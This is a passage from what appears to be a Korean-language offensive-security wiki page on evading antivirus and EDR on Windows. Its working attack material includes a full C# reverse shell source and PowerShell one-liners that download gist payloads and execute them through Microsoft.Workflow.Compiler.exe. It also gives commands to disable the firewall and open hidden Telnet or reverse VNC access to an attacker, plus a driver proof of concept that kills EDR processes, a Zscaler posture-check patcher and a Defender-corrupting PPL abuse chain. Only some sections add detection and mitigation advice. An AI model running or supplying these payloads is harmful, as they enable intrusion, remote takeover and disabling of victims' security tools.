위 chain은 malicious sample을 실행할 **필요 없이** execution flow를 복원하므로, offline workstation에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 custom attribute를 생성하며, 이를 IOC로 사용하여 sample을 자동으로 triage할 수 있습니다.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) compilation suite의 open-source fork를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 tamper-proofing을 통해 향상된 software security를 제공하는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 tool을 사용하거나 compiler를 수정하지 않고 `C++11/14` language를 사용해 compile time에 obfuscated code를 생성하는 방법을 보여 줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework로 생성된 obfuscated operations layer를 추가하여 application을 crack하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys를 포함한 다양한 pe files를 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의의 executables를 위한 간단한 metamorphic code engine입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하는 LLVM-supported languages를 위한 fine-grained code obfuscation framework입니다. ROPfuscator는 regular instructions를 ROP chains로 변환하여 assembly code level에서 program을 obfuscate하고, normal control flow에 대한 우리의 자연스러운 인식을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 load할 수 있습니다.

## SmartScreen & MoTW

인터넷에서 일부 executables를 다운로드하고 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 malicious한 applications의 실행으로부터 end user를 보호하기 위한 security mechanism입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 reputation-based approach로 작동합니다. 즉, 자주 다운로드되지 않는 applications는 SmartScreen을 trigger하여 end user에게 경고하고 file 실행을 방지합니다(단, More Info -> Run anyway를 클릭하면 file을 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 file을 다운로드할 때 다운로드된 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 file의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificate로 서명된 executables는 **SmartScreen을 trigger하지 않는다**는 점을 알아 두는 것이 중요합니다.

payload에 Mark of The Web이 추가되는 것을 방지하는 매우 효과적인 방법은 payload를 ISO와 같은 일종의 container 내부에 packaging하는 것입니다. Mark-of-the-Web (MOTW)은 **non NTFS** volumes에는 적용할 수 **없기** 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 우회하기 위해 payload를 output containers로 packaging하는 tool입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
다음은 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 ISO 파일 안에 payload를 패키징하여 SmartScreen을 bypass하는 데모입니다.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows(ETW)는 Windows의 강력한 logging mechanism으로, 애플리케이션과 system component가 **event를 log**할 수 있도록 합니다. 그러나 security product가 malicious activity를 monitor하고 detect하는 데 사용할 수도 있습니다.

AMSI를 disabled(bypassed)하는 것과 마찬가지로, user space process의 **`EtwEventWrite`** function이 event를 log하지 않고 즉시 return하도록 만들 수도 있습니다. 이는 memory에서 function을 patch하여 즉시 return하도록 하는 방식으로 수행되며, 해당 process의 ETW logging을 effectively disabled합니다.

자세한 정보는 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 및 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary를 memory에 loading하는 방법은 오래전부터 알려져 왔으며, AV에 caught되지 않고 post-exploitation tool을 실행하는 매우 좋은 방법으로 여전히 사용됩니다.

payload가 disk를 거치지 않고 memory에 직접 loaded되므로, 전체 process에 대해 AMSI를 patch하는 것만 신경 쓰면 됩니다.

대부분의 C2 framework(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# assembly를 memory에서 직접 execute할 수 있는 기능을 제공하지만, 이를 수행하는 방법에는 여러 가지가 있습니다.

- **Fork\&Run**

**새로운 sacrificial process를 spawn**하고, 해당 process에 post-exploitation malicious code를 inject한 다음, malicious code를 execute하고 완료되면 새로운 process를 kill하는 방식입니다. 여기에는 장단점이 모두 있습니다. fork and run method의 장점은 execution이 **Beacon implant process 외부에서** 발생한다는 것입니다. 즉, post-exploitation action 중 문제가 발생하거나 caught되더라도 **implant가 survive할 가능성이 훨씬 높습니다.** 단점은 **Behavioural Detections**에 caught될 가능성이 더 높다는 것입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation malicious code를 **자체 process에** inject하는 방식입니다. 이렇게 하면 새로운 process를 생성하고 AV에 scan되는 과정을 피할 수 있지만, payload 실행 중 문제가 발생하면 crash할 수 있으므로 **beacon을 잃을** 가능성이 **훨씬 높아진다**는 단점이 있습니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading에 대해 더 읽어보고 싶다면 이 article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 해당 InlineExecute-Assembly BOF([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인하세요.

**PowerShell에서** C# Assembly를 load할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 및 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 것처럼, **Attacker Controlled SMB share에 설치된 interpreter environment**에 compromised machine이 access하도록 하여 다른 language를 사용해 malicious code를 execute할 수 있습니다.

SMB share의 Interpreter Binary와 environment에 access하도록 허용하면 compromised machine의 **memory 내에서 이러한 language로 arbitrary code를 execute**할 수 있습니다.

repo에 따르면 Defender는 여전히 script를 scan하지만, Go, Java, PHP 등을 활용하면 **static signature를 bypass할 수 있는 유연성이 더 높아집니다**. 이 language로 작성된 random un-obfuscated reverse shell script를 testing한 결과 성공적으로 동작했습니다.

## TokenStomping

Token stomping은 EDR이나 AV와 같은 security product의 access token을 manipulate합니다. Token의 privilege를 낮추면 process를 running 상태로 유지하면서 privileged inspection 또는 remediation action을 수행하지 못하게 할 수 있습니다.

이를 방지하기 위해 Windows는 **external process가** security process의 token에 대한 handle을 획득하지 못하도록 **막을 수 있습니다**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**이 blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에 설명된 것처럼, victim PC에 Chrome Remote Desktop을 deploy한 다음 이를 사용해 takeover하고 persistence를 유지하는 것은 간단합니다.<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/에서 download하고, "Set up via SSH"를 클릭한 다음 Windows용 MSI file을 클릭하여 MSI file을 download합니다.
2. victim에서 installer를 silently run합니다(admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page로 돌아가 next를 클릭합니다. 그러면 wizard에서 authorize를 요청합니다. Authorize button을 클릭하여 계속합니다.
4. 필요한 부분을 조정하여 제공된 command를 execute합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter는 GUI를 사용하지 않고 PIN을 설정합니다).


## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 때로는 하나의 system에서 여러 telemetry source를 고려해야 하므로, mature environment에서 완전히 undetected 상태를 유지하는 것은 사실상 불가능합니다.

대응하는 각 environment에는 고유한 강점과 약점이 있습니다.

더 Advanced Evasion technique를 이해하기 위한 출발점으로 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 talk를 꼭 시청하는 것을 권장합니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

또한 [@mariuszbit](https://twitter.com/mariuszbit)가 Evasion in Depth에 대해 설명하는 훌륭한 talk도 있습니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 **Defender가 malicious하다고 판단하는 부분을 찾아낼 때까지 binary의 일부를** **remove**한 후 해당 부분을 분리해낼 수 있습니다.\
**동일한 작업을 수행하는** 또 다른 tool은 [**avred**](https://github.com/dobin/avred)이며, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 open web service로 제공됩니다.

### **Telnet Server**

Windows 10까지 모든 Windows에는 **Telnet server**가 포함되어 있었으며, 다음과 같이 (administrator 권한으로) install할 수 있었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하도록 설정하고 지금 **실행**하세요:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경** (stealth) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드합니다: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup이 아닌 bin downloads가 필요합니다)

**ON THE HOST**: _**winvnc.exe**_를 실행하고 server를 구성합니다:

- _Disable TrayIcon_ 옵션을 활성화합니다
- _VNC Password_에 password를 설정합니다
- _View-Only Password_에 password를 설정합니다

그런 다음 binary _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 내부로 이동합니다

#### **Reverse connection**

**attacker**는 **자신의 host 내부에서** binary `vncviewer.exe -listen 5900`을 **실행**하여 reverse **VNC connection**을 수신할 수 있도록 **준비**해야 합니다. 그런 다음 **victim** 내부에서 winvnc daemon `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다

**WARNING:** stealth를 유지하려면 몇 가지 작업을 수행하지 않아야 합니다

- `winvnc`가 이미 실행 중인 경우 다시 시작하지 마세요. [popup](https://i.imgur.com/1SROTTl.png)이 발생합니다. `tasklist | findstr winvnc`로 실행 중인지 확인합니다
- 동일한 directory에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. [config window](https://i.imgur.com/rfMQWcf.png)가 열립니다
- 도움말을 확인하기 위해 `winvnc -h`를 실행하지 마세요. [popup](https://i.imgur.com/oc18wcu.png)이 발생합니다

### GreatSCT

다음에서 다운로드합니다: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`를 사용해 **lister**를 시작하고 다음을 사용해 **xml payload**를 **execute**합니다:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 defender가 process를 매우 빠르게 terminate합니다.**

### 자체 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일합니다:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용하세요:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler 사용
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators 목록: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 injector 빌드 예시:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 도구
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 추가 정보

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space에서 AV/EDR 종료

Storm-2603은 ransomware를 배포하기 전에 endpoint protection을 비활성화하기 위해 **Antivirus Terminator**라는 작은 console utility를 사용했습니다. 이 tool은 **취약하지만 *signed*된 자체 driver**를 가져와 이를 악용하여, Protected-Process-Light (PPL) AV service조차 차단할 수 없는 권한 있는 kernel operation을 실행합니다.<sup>[[12]](#references)</sup>

핵심 내용
1. **Signed driver**: 디스크에 전달되는 파일은 `ServiceMouse.sys`이지만, binary는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정상적으로 signed된 driver인 `AToolsKrnl64.sys`입니다. 이 driver에는 유효한 Microsoft signature가 있으므로 Driver-Signature-Enforcement (DSE)가 활성화된 경우에도 로드됩니다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 driver를 **kernel service**로 등록하고, 두 번째 줄은 이를 시작하여 user land에서 `\\.\ServiceMouse`에 접근할 수 있도록 합니다.
3. **Driver가 노출하는 IOCTL**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID로 임의의 process 종료 (Defender/EDR service 종료에 사용) |
| `0x990000D0` | 디스크의 임의의 file 삭제 |
| `0x990001D0` | driver unload 및 service 제거 |

최소 C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **작동하는 이유**: BYOVD는 user-mode protection을 완전히 우회합니다. kernel에서 실행되는 code는 *protected* process를 열고 종료하거나 kernel object를 변조할 수 있으며, PPL/PP, ELAM 또는 기타 hardening feature와 관계없이 이러한 작업이 가능합니다.

Detection / Mitigation
•  Microsoft의 vulnerable-driver block list (`HVCI`, `Smart App Control`)를 활성화하여 Windows가 `AToolsKrnl64.sys`를 로드하지 못하도록 합니다.
•  새로운 *kernel* service가 생성되는지 모니터링하고, driver가 world-writable directory에서 로드되거나 allow-list에 없는 경우 alert를 생성합니다.
•  custom device object에 대한 user-mode handle이 생성된 후 의심스러운 `DeviceIoControl` call이 수행되는지 감시합니다.

### On-Disk Binary Patching을 통한 Zscaler Client Connector Posture Check 우회

Zscaler의 **Client Connector**는 device-posture rule을 로컬에서 적용하고 Windows RPC를 사용하여 그 결과를 다른 component에 전달합니다. 두 가지 취약한 design choice로 인해 완전한 bypass가 가능합니다:

1. Posture evaluation이 **전적으로 client-side에서 수행**됩니다 (boolean 값이 server로 전송됨).
2. Internal RPC endpoint는 연결하는 executable이 Zscaler에 의해 **signed**되었는지만 (`WinVerifyTrust`를 통해) 검증합니다.<sup>[[11]](#references)</sup>

**디스크에 있는 signed binary 네 개를 patching**하면 두 mechanism을 모두 무력화할 수 있습니다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 모든 check가 compliant가 되도록 항상 `1` 반환 |
| `ZSAService.exe` | `WinVerifyTrust`에 대한 indirect call | NOP 처리 ⇒ 어떤 process든 (unsigned process 포함) RPC pipe에 bind 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 교체 |
| `ZSATunnel.exe` | tunnel의 integrity check | Short-circuit됨 |

최소 patcher 발췌:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 service stack을 다시 시작한 후:

* **모든** posture check가 **green/compliant**로 표시됩니다.
* 서명되지 않았거나 수정된 binary가 named-pipe RPC endpoint(예: `\\RPC Control\\ZSATrayManager_talk_to_me`)를 열 수 있습니다.
* compromised host가 Zscaler policy로 정의된 internal network에 unrestricted access를 확보합니다.

이 case study는 순수한 client-side trust decision과 단순한 signature check가 몇 번의 byte patch만으로 무력화될 수 있음을 보여줍니다.

## LOLBIN을 사용해 Protected Process Light (PPL)를 악용하여 AV/EDR 변조

Protected Process Light (PPL)는 signer/level hierarchy를 적용하여 동일하거나 더 높은 보호 수준의 protected process만 서로 변조할 수 있도록 합니다. 공격 관점에서는 PPL-enabled binary를 정상적으로 실행하고 해당 binary의 arguments를 제어할 수 있다면, benign functionality(예: logging)를 AV/EDR이 사용하는 protected directory에 대해 제한된 PPL-backed write primitive로 전환할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Process가 PPL로 실행되기 위한 조건
- 대상 EXE(및 로드되는 모든 DLL)는 PPL-capable EKU로 서명되어야 합니다.
- Process는 다음 flags를 사용하여 CreateProcess로 생성되어야 합니다: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- binary의 signer와 일치하는 호환 가능한 protection level을 요청해야 합니다(예: anti-malware signer에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 level을 사용하면 creation이 실패합니다.

PP/PPL 및 LSASS protection에 대한 보다 폭넓은 소개는 다음을 참조하세요:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL(protection level을 선택하고 arguments를 대상 EXE로 전달):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 binary `C:\Windows\System32\ClipUp.exe`는 자체적으로 spawn되며, 호출자가 지정한 경로에 log file을 작성하는 parameter를 허용합니다.
- PPL process로 실행되면 file write가 PPL backing을 사용해 수행됩니다.
- ClipUp은 spaces가 포함된 paths를 parse할 수 없으므로, 일반적으로 보호되는 locations를 가리킬 때 8.3 short paths를 사용합니다.

8.3 short path helpers
- Short names 나열: 각 parent directory에서 `dir /x` 실행.
- cmd에서 short path 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher (예: CreateProcessAsPPL)를 사용해 `CREATE_PROTECTED_PROCESS`와 함께 PPL-capable LOLBIN (ClipUp)을 실행합니다.
2) ClipUp log-path argument를 전달해 보호된 AV directory (예: Defender Platform)에 file creation을 강제합니다. 필요한 경우 8.3 short names를 사용합니다.
3) 대상 binary가 실행 중 AV에 의해 일반적으로 열려 있거나 locked 상태인 경우 (예: MsMpEng.exe), 더 이른 시점에 안정적으로 실행되는 auto-start service를 설치해 AV가 시작되기 전에 boot 시 write를 예약합니다. Process Monitor (boot logging)를 사용해 boot ordering을 검증합니다.
4) Reboot 시 PPL-backed write가 AV가 해당 binaries를 lock하기 전에 수행되어 대상 file을 손상시키고 startup을 방지합니다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
참고 및 제약 사항
- ClipUp이 기록하는 콘텐츠는 배치 위치 외에는 제어할 수 없습니다. 따라서 이 primitive은 정밀한 콘텐츠 주입보다는 corruption에 적합합니다.
- service를 설치/시작하고 reboot window를 확보하려면 local admin/SYSTEM이 필요합니다.
- Timing이 중요합니다. 대상 파일이 열려 있지 않아야 하며, boot-time execution은 file lock을 피할 수 있습니다.

탐지
- 특히 비표준 launcher가 parent인 경우, boot 전후에 비정상적인 arguments와 함께 `ClipUp.exe`가 process creation되는지 확인합니다.
- 의심스러운 binary를 auto-start하도록 구성된 새 service와 Defender/AV보다 먼저 일관되게 시작되는 service를 확인합니다. Defender startup failure가 발생하기 전에 service가 생성/수정되었는지 조사합니다.
- Defender binary/Platform directory에 대한 file integrity monitoring을 수행합니다. protected-process flag를 사용하는 process에서 예상치 못한 file creation/modification이 발생하는지 확인합니다.
- ETW/EDR telemetry에서 `CREATE_PROTECTED_PROCESS`로 생성된 process와 non-AV binary의 비정상적인 PPL level 사용을 확인합니다.

완화
- WDAC/Code Integrity: 어떤 signed binary가 PPL로 실행될 수 있는지와 해당 parent를 제한하고, 정상적인 context 외부에서의 ClipUp invocation을 차단합니다.
- Service hygiene: auto-start service의 생성/수정을 제한하고 start-order manipulation을 모니터링합니다.
- Defender tamper protection과 early-launch protections가 활성화되어 있는지 확인하고, binary corruption을 나타내는 startup error를 조사합니다.
- 환경과 호환되는 경우 security tooling을 호스팅하는 volume에서 8.3 short-name generation을 비활성화하는 방안을 고려합니다. 충분히 테스트해야 합니다.

## Platform Version Folder Symlink Hijack을 통한 Microsoft Defender Tampering

Windows Defender는 다음 경로 아래의 subfolder를 열거하여 실행할 platform을 선택합니다.
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

